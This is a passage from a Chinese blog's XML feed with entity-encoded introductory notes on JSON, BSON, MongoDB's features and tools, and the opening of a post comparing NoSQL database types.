&#x6210;&#x4E3A;&#x7406;&#x60F3;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x8BED;&#x8A00;.&#x6613;&#x4E8E;&#x4EBA;&#x9605;&#x8BFB;&#x548C;&#x7F16;&#x5199;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x6613;&#x4E8E;&#x673A;&#x5668;&#x89E3;&#x6790;&#x548C;&#x751F;&#x6210;(&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x63D0;&#x5347;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x901F;&#x7387;)&#x3002;JSON &#x7684;&#x5B98;&#x65B9; MIME &#x7C7B;&#x578B;&#x662F; application/json,&#x6587;&#x4EF6;&#x6269;&#x5C55;&#x540D;&#x662F;.json&#x3002;</p><p>MongoDB &#x4F7F;&#x7528; JSON&#xFF08;JavaScript ObjectNotation&#xFF09;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x8BB0;&#x5F55;&#x3002;<br>JSON &#x7B80;&#x5355;&#x8BF4;&#x5C31;&#x662F; JavaScript &#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#x53EF;&#x4EE5;&#x8868;&#x793A;&#x5404;&#x79CD;&#x590D;&#x6742;&#x7684;&#x7ED3;&#x6784;&#x3002;</p><p><strong>&#x5BF9;&#x8C61;&#xFF1A;</strong><br>&#x5BF9;&#x8C61;&#x5728; js &#x4E2D;&#x8868;&#x793A;&#x4E3A;&#x201C;{}&#x201D;&#x62EC;&#x8D77;&#x6765;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E3A; {key&#xFF1A; value,key&#xFF1A; value,&#x2026;}&#x7684;&#x952E;&#x503C;&#x5BF9;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x5728;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x8BED;&#x8A00;&#x4E2D;&#xFF0C; key &#x4E3A;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#xFF0C; value &#x4E3A;&#x5BF9;&#x5E94;&#x7684;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x53D6;&#x503C;&#x65B9;&#x6CD5;&#x4E3A; &#x5BF9;&#x8C61;.key &#x83B7;&#x53D6;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x662F; &#x6570;&#x5B57;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;&#x51E0;&#x79CD;&#x3002;<br>&#x4F8B;&#x5982;&#xFF1A; {&#x201C;FirstName&#x201D;:&#x201D;ke&#x201D;,&#x201D;LastName&#x201D;:&#x201D;me&#x201D;,&#x201D;email&#x201D;:&#x201D;hikeme@aa&#x201D;}<br>&#x53D6;&#x503C;&#x65B9;&#x5F0F;&#x548C;&#x6240;&#x6709;&#x8BED;&#x8A00;&#x4E2D;&#x4E00;&#x6837;,&#x4F7F;&#x7528; key &#x83B7;&#x53D6;,&#x5B57;&#x6BB5;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x662F; &#x6570;&#x5B57;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;&#x51E0;&#x79CD;&#x3002;</p><h3 id="2-1-2-BSON"><a href="#2-1-2-BSON" class="headerlink" title="2.1.2 BSON"></a>2.1.2 BSON</h3><p>BSON &#x662F;&#x4E00;&#x79CD;&#x7C7B; JSON &#x7684;&#x4E00;&#x79CD;&#x4E8C;&#x8FDB;&#x5236;&#x5F62;&#x5F0F;&#x7684;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#xFF0C;&#x7B80;&#x79F0; Binary JSON&#xFF0C;&#x5B83;&#x548C; JSON &#x4E00;&#x6837;&#xFF0C;&#x652F;&#x6301;&#x5185;&#x5D4C;&#x7684;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F; BSON &#x6709; JSON &#x6CA1;&#x6709;&#x7684;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5982; Date &#x548C; BinData &#x7C7B;&#x578B;&#x3002;  </p><p>&#x5B83;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x7075;&#x6D3B;&#x6027;&#x9AD8;&#xFF0C;&#x4F46;&#x5B83;&#x7684;&#x7F3A;&#x70B9;&#x662F;&#x7A7A;&#x95F4;&#x5229;&#x7528;&#x7387;&#x4E0D;&#x662F;&#x5F88;&#x7406;&#x60F3;&#x3002;<br>BSON &#x6709;&#x4E09;&#x4E2A;&#x7279;&#x70B9;&#xFF1A;&#x8F7B;&#x91CF;&#x6027;&#x3001;&#x53EF;&#x904D;&#x5386;&#x6027;&#x3001;&#x9AD8;&#x6548;&#x6027;&#x3002;<br>&#x5BF9;JSON &#x6765;&#x8BF4;&#xFF0C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x662F;&#x65E0;&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x4F60;&#x8981;&#x4FEE;&#x6539;&#x57FA;&#x672C;&#x4E00;&#x4E2A;&#x503C;&#xFF0C;&#x4ECE; 9 &#x5230; 10&#xFF0C;&#x7531;&#x4E8E;&#x4ECE;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x53D8;&#x6210;&#x4E86;&#x4E24;&#x4E2A;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x80FD;&#x5176;&#x540E;&#x9762;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#x90FD;&#x9700;&#x8981;&#x5F80;&#x540E;&#x79FB;&#x4E00;&#x4F4D;&#x624D;&#x53EF;&#x4EE5;&#x3002;&#x800C;&#x4F7F;&#x7528; BSON&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x8FD9;&#x4E2A;&#x5217;&#x4E3A;&#x6570;&#x5B57;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x65E0;&#x8BBA;&#x6570;&#x5B57;&#x4ECE; 9 &#x957F;&#x5230; 10 &#x8FD8;&#x662F; 100&#xFF0C;&#x6211;&#x4EEC;&#x90FD;&#x53EA;&#x662F;&#x5728;&#x5B58;&#x50A8;&#x6570;&#x5B57;&#x7684;&#x90A3;&#x4E00;&#x4F4D;&#x4E0A;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF0C;&#x4E0D;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x603B;&#x957F;&#x53D8;&#x5927;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x5728; MongoDB &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x5B57;&#x4ECE;&#x6574;&#x5F62;&#x589E;&#x5927;&#x5230;&#x957F;&#x6574;&#x578B;&#xFF0C;&#x8FD8;&#x662F;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x603B;&#x957F;&#x53D8;&#x5927;&#x7684;&#x3002;</p><p>&#x6709;&#x65F6; BSON &#x76F8;&#x5BF9; JSON &#x6765;&#x8BF4;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x7A7A;&#x95F4;&#x4E0A;&#x7684;&#x4F18;&#x52BF;&#xFF0C;&#x6BD4;&#x5982;&#x5BF9;{&#x201C;sex&#x201D;:1}&#xFF0C;&#x5728; JSON &#x7684;&#x5B58;&#x50A8;&#x4E0A;,&#x2019;1&#x2019;&#x53EA;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x7528; BSON&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x81F3;&#x5C11; 4 &#x4E2A;&#x5B57;&#x8282;</p><h2 id="2-2-MongoDB-&#x7279;&#x70B9;"><a href="#2-2-MongoDB-&#x7279;&#x70B9;" class="headerlink" title="2.2 MongoDB &#x7279;&#x70B9;"></a>2.2 MongoDB &#x7279;&#x70B9;</h2><p><strong>&#x9AD8;&#x6027;&#x80FD;&#xFF1A;</strong> Mongodb &#x63D0;&#x4F9B;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6570;&#x636E;&#x6301;&#x4E45;&#x6027;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x652F;&#x6301;&#x5D4C;&#x5165;&#x5F0F;&#x6570;&#x636E;&#x6A21;&#x578B;&#x51CF;&#x5C11;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;I/O &#x64CD;&#x4F5C;&#xFF0C;&#x7D22;&#x5F15;&#x652F;&#x6301;&#x80FD;&#x5FEB;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5305;&#x62EC;&#x6765;&#x5D4C;&#x5165;&#x5F0F;&#x6587;&#x6863;&#x548C;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x952E;</p><p><strong>&#x4E30;&#x5BCC;&#x7684;&#x8BED;&#x8A00;&#x67E5;&#x8BE2;&#xFF1A;</strong> Mongodb &#x652F;&#x6301;&#x4E30;&#x5BCC;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x8A00;&#x6765;&#x652F;&#x6301;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#xFF08;CRUD&#xFF09;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x6C47;&#x603B;&#xFF0C;&#x6587;&#x672C;&#x641C;&#x7D22;&#x548C;&#x5730;&#x7406;&#x7A7A;&#x95F4;&#x7D22;&#x5F15;</p><p><strong>&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF1A;</strong> Mongodb &#x7684;&#x590D;&#x5236;&#x5DE5;&#x5177;&#xFF0C;&#x6210;&#x4E3A;&#x526F;&#x672C;&#x96C6;&#xFF0C;&#x63D0;&#x4F9B;&#x81EA;&#x52A8;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x548C;&#x6570;&#x636E;&#x5197;&#x4F59;&#xFF0C;&#x6C34;&#x5E73;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF1A; Mongodb &#x63D0;&#x4F9B;&#x4E86;</p><p><strong>&#x53EF;&#x6269;&#x5C55;&#x6027;</strong>&#xFF0C;&#x4F5C;&#x4E3A;&#x5176;&#x6838;&#x5FC3;&#x529F;&#x80FD;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5206;&#x7247;&#x662F;&#x5C06;&#x6570;&#x636E;&#x5206;&#xFF0C;&#x5728;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x3002;</p><p><strong>&#x652F;&#x6301;&#x591A;&#x79CD;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A;</strong> WiredTiger &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C;&#x3001; MMAPv1 &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x548C; InMemory &#x5B58;&#x50A8;&#x5F15;&#x64CE;</p><h2 id="2-3-MongoDB-&#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;"><a href="#2-3-MongoDB-&#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;" class="headerlink" title="2.3 MongoDB &#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;"></a>2.3 MongoDB &#x5305;&#x542B;&#x7684;&#x7A0B;&#x5E8F;</h2><p><code>MongoDB Drivers</code><br>&#x5B98;&#x65B9; MongoDB &#x5BA2;&#x6237;&#x7AEF;&#x5E93;&#x63D0;&#x4F9B; C&#xFF0C; C ++&#xFF0C; C&#xFF03;&#xFF0C; Java&#xFF0C; Node.JS&#xFF0C; Perl&#xFF0C; PHP&#xFF0C;Python&#xFF0C; Ruby&#x548C;Scala &#x9A71;&#x52A8;&#x7A0B;&#x5E8F;&#x7684;&#x53C2;&#x8003;&#x6307;&#x5357;&#x3002;</p><p><code>MongoDB Stitch</code><br>&#x4E3A;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A; API &#x5230; MongoDB &#x548C;&#x5176;&#x4ED6;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x3002;&#x4FDD;&#x6301; MongoDB &#x7684;&#x5168;&#x90E8;&#x529F;&#x80FD;&#x548C;&#x7075;&#x6027;&#xFF0C;&#x540C;&#x65F6;&#x53D7;&#x76CA;&#x4E8E;&#x5F3A;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x914D;&#x7F6E;&#x7EC6;&#x7C92;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x63A7;&#x5236;&#x3002;</p><p><code>MongoDB Atlas</code><br>MongoDB &#x5728;&#x4E91;&#x4E2D;&#x90E8;&#x7F72;&#xFF0C;&#x64CD;&#x4F5C;&#x548C;&#x6269;&#x5C55;&#x7684;&#x6700;&#x4F73;&#x65B9;&#x5F0F;&#x3002;&#x9002;&#x7528;&#x4E8E; AWS&#xFF0C;Azure &#x548C; Google Cloud Platform&#x3002;&#x8F7B;&#x677E;&#x5C06;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230; MongoDB Atlas&#xFF0C;&#x96F6;&#x505C;&#x673A;</p><p><code>MongoDB Cloud Manager</code><br>&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x7BA1;&#x7406; MongoDB &#x90E8;&#x7F72;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x3002; Ops Manager &#x63D0;&#x4F9B; Ops Manager &#x76D1;&#x63A7;&#x548C; Ops Manager &#x5907;&#x4EFD;&#xFF0C;&#x53EF;&#x5E2E;&#x52A9;&#x7528;&#x6237;&#x4F18;&#x5316;&#x7FA4;&#x96C6;&#x5E76;&#x964D;&#x4F4E;&#x64CD;&#x4F5C;&#x98CE;&#x9669;</p><p><code>MongoDB Charts</code><br>&#x53EF;&#x4EE5;&#x6700;&#x5FEB;&#x901F;&#x6700;&#x7B80;&#x5355;&#x7684;&#x521B;&#x5EFA; Mongodb &#x53EF;&#x89C6;&#x5316;&#x56FE;&#x8868;</p><p><code>MongoDB Connector for BI</code><br>MongoDB &#x5546;&#x4E1A;&#x667A;&#x80FD;&#x8FDE;&#x63A5;&#x5668;&#xFF08;BI&#xFF09;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4F7F;&#x7528; SQL &#x521B;&#x5EFA;&#x67E5;&#x8BE2;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x73B0;&#x6709;&#x7684;&#x5173;&#x7CFB;&#x5546;&#x4E1A;&#x667A;&#x80FD;&#x5DE5;&#x5177;&#xFF08;&#x5982; Tableau&#xFF0C; MicroStrategy &#x548C; Qlik&#xFF09;&#x5BF9;&#x5176; MongoDB Enterprise &#x6570;&#x636E;&#x8FDB;&#x884C;&#x53EF;&#x89C6;&#x5316;&#xFF0C;&#x56FE;&#x5F62;&#x5316;&#x548C;&#x62A5;&#x544A;&#x3002;</p><p><code>MongoDB Compass</code><br>&#x901A;&#x8FC7;&#x4ECE;&#x96C6;&#x5408;&#x4E2D;&#x968F;&#x673A;&#x62BD;&#x6837;&#x4E00;&#x4E2A;&#x6587;&#x6863;&#x5B50;&#x96C6;&#xFF0C;&#x4E3A;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x5176; MongoDB &#x6A21;&#x5F0F;&#x7684;&#x56FE;&#x5F62;&#x89C6;&#x56FE;&#x3002;&#x91C7;&#x6837;&#x6587;&#x4EF6;&#x53EF;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x5730;&#x964D;&#x4F4E;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x5E76;&#x80FD;&#x5FEB;&#x901F;&#x4EA7;&#x751F;&#x7ED3;&#x679C;&#x3002;&#x6709;&#x5173; &#x62BD;&#x6837;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;</p><p><code>MongoDB Spark Connector</code><br>&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x5668;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x6240;&#x6709;&#x4F7F;&#x7528; MongoDB &#x6570;&#x636E;&#x96C6;&#x7684; Spark &#x5E93;&#xFF1A;&#x7528; SQL &#x8FDB;&#x884C;&#x5206;&#x6790;&#x7684;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x53D7;&#x76CA;&#x4E8E;&#x81EA;&#x52A8;&#x6A21;&#x5F0F;&#x63A8;&#x7406;&#xFF09;&#xFF0C;&#x6D41;&#x5F0F;&#x4F20;&#x8F93;&#xFF0C;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x548C;&#x56FE;&#x5F62; API&#x3002;&#x60A8;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FDE;&#x63A5;&#x5668;&#x4E0E; Spark Shell&#x3002;</p><h2 id="&#x5E94;&#x7528;&#x573A;&#x666F;"><a href="#&#x5E94;&#x7528;&#x573A;&#x666F;" class="headerlink" title="&#x5E94;&#x7528;&#x573A;&#x666F;"></a>&#x5E94;&#x7528;&#x573A;&#x666F;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MongoDB&amp;#x4ECB;&amp;#x7ECD;&quot;&gt;&lt;a href=&quot;#MongoDB&amp;#x4ECB;&amp;#x7ECD;&quot; class=&quot;headerlink&quot; title=&quot;MongoDB&amp;#x4ECB;&amp;#x7ECD;&quot;&gt;&lt;/a&gt;MongoDB&amp;#x4ECB;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NoSQL知识</title>
    <link href="https://marnm.github.io//posts/36ba38f9/"/>
    <id>https://marnm.github.io//posts/36ba38f9/</id>
    <published>2022-06-07T04:42:29.000Z</published>
    <updated>2022-06-07T05:18:04.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h1><p>NoSQL&#xFF08;Not Only SQL&#xFF09;&#xFF0C;&#x610F;&#x5373;&#x201D;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F; SQL&#x201D;&#x3002;</p><p>NoSQL&#x6700;&#x5E38;&#x89C1;&#x7684;&#x89E3;&#x91CA;&#x662F;<code>non-relational</code>&#xFF0C;<code>Not Only SQL</code>&#x4E5F;&#x88AB;&#x5F88;&#x591A;&#x4EBA;&#x63A5;&#x53D7;&#x3002;NoSQL&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x6CDB;&#x6307;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x533A;&#x522B;&#x4E0E;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B83;&#x4EEC;&#x4E0D;&#x4FDD;&#x8BC1;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x7684;ACID&#x7279;&#x6027;&#x3002;&#x8981;&#x89E3;&#x7B54;&#x7B2C;&#x4E00;&#x70B9;&#x7591;&#x95EE;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x660E;&#x767D;NoSQL&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4EC0;&#x4E48;&#x51FA;&#x73B0;&#x7684;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;NoSQL&#x662F;&#x968F;&#x7740;&#x5927;&#x6570;&#x636E;&#x65F6;&#x4EE3;&#x9700;&#x6C42;&#x63D0;&#x51FA;&#x6240;&#x9010;&#x6E10;&#x53D1;&#x5C55;&#x7684;&#xFF0C;&#x9488;&#x5BF9;&#x6D77;&#x91CF;&#x7684;&#x6570;&#x636E;&#x751A;&#x81F3;&#x662F;&#x975E;&#x7ED3;&#x6784;&#x5316;&#x6570;&#x636E;&#x8981;&#x5B9E;&#x73B0;<strong>&#x9AD8;&#x5E76;&#x53D1;</strong>&#xFF0C;<strong>&#x9AD8;&#x53EF;&#x6269;</strong>&#xFF0C;&#x4EE5;&#x53CA;<strong>&#x9AD8;&#x6027;&#x80FD;</strong>&#x7684;&#x7279;&#x70B9;&#x3002;</p><p><strong>1.</strong> &#x9996;&#x5148;&#x662F;&#x9AD8;&#x5E76;&#x53D1;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;NoSQL&#x505A;&#x7F13;&#x51B2;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x5230;NoSQL&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x3002;&#x63D0;&#x4F9B;&#x4E86;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x4ECE;&#x5206;&#x7C7B;&#x5BF9;&#x9AD8;&#x5E76;&#x53D1;&#x4E4B;&#x5916;&#x7684;&#x5176;&#x5B83;&#x5E76;&#x53D1;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x3002;<br><strong>2.</strong> &#x7B2C;&#x4E8C;&#x70B9;&#x5C31;&#x662F;&#x9AD8;&#x53EF;&#x6269;&#xFF0C;NoSQL&#x65E0;&#x9700;&#x4E8B;&#x5148;&#x4E3A;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x5EFA;&#x7ACB;&#x5B57;&#x6BB5;&#xFF0C;&#x968F;&#x65F6;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x3002;NoSQL&#x6570;&#x636E;&#x5E93;&#x79CD;&#x7C7B;&#x7E41;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E2A;&#x5171;&#x540C;&#x70B9;&#x90FD;&#x662F;&#x53BB;&#x6389;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x7279;&#x6027;&#x3002;&#x6570;&#x636E;&#x4E4B;&#x95F4;&#x65E0;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x975E;&#x5E38;&#x5BB9;&#x6613;&#x6269;&#x5C55;&#x3002;&#x4E5F;&#x65E0;&#x5F62;&#x4E4B;&#x95F4;&#xFF0C;&#x5728;&#x67B6;&#x6784;&#x7684;&#x5C42;&#x9762;&#x4E0A;&#x5E26;&#x6765;&#x4E86;&#x53EF;&#x6269;&#x5C55;&#x7684;&#x80FD;&#x529B;&#x3002;<br><strong>3.</strong> &#x6700;&#x540E;&#x4E00;&#x70B9;&#x662F;&#x9AD8;&#x6027;&#x80FD;&#xFF0C;&#x8FD9;&#x4E00;&#x70B9;&#x8DDF;&#x7B2C;&#x4E00;&#x70B9;&#x9AD8;&#x5E76;&#x53D1;&#x606F;&#x606F;&#x76F8;&#x5173;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x7531;&#x4E8E;NoSQL&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5177;&#x6709;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#xFF0C;&#x5C24;&#x5176;&#x5728;&#x5927;&#x6570;&#x636E;&#x91CF;&#x4E0B;&#xFF0C;&#x540C;&#x6837;&#x8868;&#x73B0;&#x4F18;&#x79C0;&#x3002;&#x8FD9;&#x5F97;&#x76CA;&#x4E8E;&#x5B83;&#x7684;&#x65E0;&#x5173;&#x7CFB;&#x6027;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7ED3;&#x6784;&#x7B80;&#x5355;&#x3002;</p><h1 id="&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL"><a href="#&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL" class="headerlink" title="&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x4F7F;&#x7528;NoSQL</h1><table><thead><tr><th>&#x9700;&#x6C42;</th><th>NoSQL&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;</th></tr></thead><tbody><tr><td>&#x9AD8;&#x5E76;&#x53D1;</td><td>&#x4F7F;&#x7528;NoSQL&#x505A;&#x7F13;&#x51B2;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x8BF7;&#x6C42;&#x5148;&#x8BBF;&#x95EE;&#x5230;NoSQL&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x3002;</td></tr><tr><td>&#x9AD8;&#x53EF;&#x6269;</td><td>NoSQL&#x65E0;&#x9700;&#x4E8B;&#x5148;&#x4E3A;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x5EFA;&#x7ACB;&#x5B57;&#x6BB5;&#xFF0C;&#x968F;&#x65F6;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#x683C;&#x5F0F;</td></tr><tr><td>&#x9AD8;&#x6027;&#x80FD;</td><td>NoSQL&#x6570;&#x636E;&#x5E93;&#x90FD;&#x5177;&#x6709;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#xFF0C;&#x5C24;&#x5176;&#x5728;&#x5927;&#x6570;&#x636E;&#x91CF;&#x4E0B;&#xFF0C;&#x540C;&#x6837;&#x8868;&#x73B0;&#x4F18;&#x79C0;&#x3002;&#x8FD9;&#x5F97;&#x76CA;&#x4E8E;&#x5B83;&#x7684;&#x65E0;&#x5173;&#x7CFB;&#x6027;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7ED3;&#x6784;&#x7B80;&#x5355;</td></tr></tbody></table><h1 id="&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;"><a href="#&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;" class="headerlink" title="&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;"></a>&#x5404;&#x79CD;&#x7C7B;&#x578B;&#x7684;NoSQL&#x6BD4;&#x8F83;</h1><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x4E3E;&#x4F8B;</th><th>&#x5E94;&#x7528;&#x573A;&#x666F;/&#x7279;&#x6027;</th></tr></thead><tbody><tr><td>KV&#x578B;NoSQL</td><td>Redis&#xFF0C;memcachedDB</td><td>&#x7528;&#x4E8E;&#x5185;&#x5BB9;&#x7F13;&#x5B58;&#x7B49;&#xFF0C;&#x6570;&#x636E;&#x57FA;&#x4E8E;&#x5185;&#x5B58;&#xFF0C;&#x8BFB;&#x5199;&#x6548;&#x7387;&#x9AD8;&#xFF0C;KV&#x578B;&#x6570;&#x636E;&#xFF0C;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;O(1)&#xFF0C;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x5FEB;</td></tr><tr><td>&#x5217;&#x5F0F;NoSQL</td><td>HBase&#xFF0C;Cassandra</td><td>&#x5217;&#x5F0F;NoSql&#x548C;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E00;&#x6837;&#x90FD;&#x6709;&#x4E3B;&#x952E;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x662F;&#x6309;&#x7167;&#x884C;&#x7EC4;&#x7EC7;&#x7684;&#x6570;&#x636E;, 